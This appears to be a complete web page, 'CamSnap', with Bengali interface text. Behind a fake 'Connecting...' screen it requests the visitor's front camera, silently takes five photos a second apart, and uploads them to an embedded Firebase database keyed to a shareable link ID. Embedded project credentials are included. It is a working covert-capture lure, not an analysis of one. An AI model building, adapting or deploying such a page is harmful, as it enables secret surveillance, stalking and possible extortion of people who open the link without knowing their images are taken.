<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CamSnap</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body,html{margin:0;height:100%;background:#000;overflow:hidden;position:relative;}
    .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
    .msg{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:22px;text-align:center;background:rgba(0,0,0,0.7);padding:20px 40px;border-radius:20px;}
  </style>
</head>
<body>

<div class="bg"></div>
<div class="msg">কানেক্টিং...</div>

<canvas id="c" style="display:none;"></canvas>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ID নেওয়া
let id = location.pathname.split('/').pop();
if (!id || id === 'view.html') {
  const params = new URLSearchParams(location.search);
  id = params.get('id');
}

if (!id) {
  document.querySelector('.msg').textContent = "লিংক ভুল!";
  throw new Error("No ID");
}

const today = new Date().toLocaleDateString('bn-BD');
const now = new Date().toLocaleString('bn-BD');

let count = 0;
let pics = [];

// পেইজ লোড হলেই ক্যামেরা চালু
navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
  .then(stream => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    video.play();

    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');

    const takePhoto = () => {
      if (count >= 5) {
        document.querySelector('.msg').textContent = "সম্পূর্ণ হয়েছে!";
        return;
      }

      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      ctx.drawImage(video, 0, 0);
      pics.push(canvas.toDataURL('image/jpeg', 0.96));
      count++;

      document.querySelector('.msg').textContent = `ছবি নেওয়া হচ্ছে... ${count}/5`;

      // ছবি সেভ করো
      db.ref('links/' + id + '/sessions/' + today).set({
        photos: pics,
        time: now
      });

      setTimeout(takePhoto, 1000); // প্রতি ১ সেকেন্ডে ১ টি
    };

    setTimeout(takePhoto, 1000);
  })
  .catch(() => {
    document.querySelector('.msg').textContent = "ক্যামেরা বন্ধ";
  });
</script>
</body>
</html>
